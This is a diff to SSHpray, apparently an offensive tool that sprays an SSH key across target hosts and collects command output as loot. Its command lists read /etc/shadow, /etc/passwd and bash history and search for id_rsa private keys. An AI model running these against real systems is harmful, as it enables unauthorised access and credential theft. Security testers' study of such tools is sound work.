@@ -42,16 +42,19 @@ class SSHpray():
         if not os.path.exists(self.loot_dir):
             os.makedirs(self.loot_dir)
         #command(s) to run. assumes bash, this is probably a stupid assumption
-        self.remote_commands = ['sudo locate id_rsa',\
-        'tail -n 50 ~/.bash_history', 'cat /etc/passwd;',\
-        'sudo cat /etc/shadow;','uname -a;','w;','who -a;','last;','exit']
-
+        #self.remote_commands = ['sudo locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last;','exit']
+        self.remote_commands = ['sudo locate id_rsa', 'locate id_rsa']
 
     #attempts to validate user supplied args
     def check_args(self, parser):
         #print version and supplied args if verbose
         if self.args.verbose is True: print(\
             '[i] Version: {}\n[i] Options: {}'.format(self.version,parser.parse_args()))
+
+        if self.args.keyfile is None:
+            print('\n[!]Please provide an unencrypted SSH private key file with -k\n')
+            parser.print_help()
+            sys.exit(1)
 
         #require at least one argument to provide targets
         if not (self.args.targets or self.args.ipaddress):
@@ -74,6 +77,9 @@ class SSHpray():
             self.user_name = os.getlogin()
         else:
             self.user_name = self.args.username
+
+
+
 
         if self.args.commands is not None:
             self.remote_commands=[]
@@ -192,7 +198,7 @@ class SSHpray():
                 ssh.close()
                 print ('[+] SSH Session to {} closed'.format(t))
             except Exception as e:
-                if self.args.verbose is True: print('[!] {:15} : {}'.format(t,e))
+                print('[!] {:15} : {}'.format(t,e))
                 pass
 
 def main():
